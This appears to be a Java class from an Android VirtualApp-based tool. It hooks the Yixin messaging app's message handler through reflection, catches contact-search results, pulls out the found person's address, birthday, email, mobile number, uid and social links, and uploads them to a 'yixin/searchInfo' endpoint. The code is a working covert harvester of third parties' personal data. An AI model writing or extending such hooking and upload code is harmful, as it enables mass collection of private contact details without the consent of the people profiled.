package io.virtualapp.app.yixin;

import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.util.Log;

import com.google.gson.Gson;
import com.weiliu.library.task.TaskStarter;

import java.lang.ref.WeakReference;

import io.virtualapp.core.BaseApplication;
import io.virtualapp.core.BaseUrlParams;
import library.ClassUtil;
import library.WeiliuLog;

public class YXRemoteHandler extends Handler {
    TaskStarter taskStarter = new TaskStarter(BaseApplication.app());

    public YXRemoteHandler() {
        super(Looper.getMainLooper());
    }

    public final void handleMessage(Message message) {
        try {
            if (message == null) return;
            if (message.obj == null) return;
            int type = (int) ClassUtil.getFieldValue(message.obj, "b");
            if (type == 221) {
                Object a = (Object) ClassUtil.invokeMethod(message.obj, "a");
                int a_a = (int) ClassUtil.getFieldValue(a, "a");
                if (a_a == 200) {
                    Object a_b = (Object) ClassUtil.getFieldValue(a, "b");
                    if (a_b == null) return;
                    YXContact yxContact = YXContact.get(a_b);
                    WeiliuLog.log(3, yxContact.toString());
                    report(yxContact);
                }
            }
        } catch (Exception e) {
            WeiliuLog.log(e);
        }
    }

    private void report(YXContact yxContact) {
        com.weiliu.library.WeiliuLog.log("成功数据");
        BaseUrlParams up = new BaseUrlParams("yixin", "searchInfo");
        up.getParams().put("address", yxContact.address);
        up.getParams().put("birthday", yxContact.birthday);
        up.getParams().put("bkimage", yxContact.bkimage);
        up.getParams().put("config", yxContact.config);
        up.getParams().put("email", yxContact.email);
        up.getParams().put("gender", yxContact.gender);
        up.getParams().put("mobile", yxContact.mobile);
        up.getParams().put("mobileHash", yxContact.mobileHash);
        up.getParams().put("nickname", yxContact.nickname);
        up.getParams().put("photourl", yxContact.photourl);
        up.getParams().put("signature", yxContact.signature);
        up.getParams().put("socials", yxContact.socials);
        up.getParams().put("uid", yxContact.uid);
        up.getParams().put("yid", yxContact.yid);
        taskStarter.startAutoCommitTask(up);
    }
}
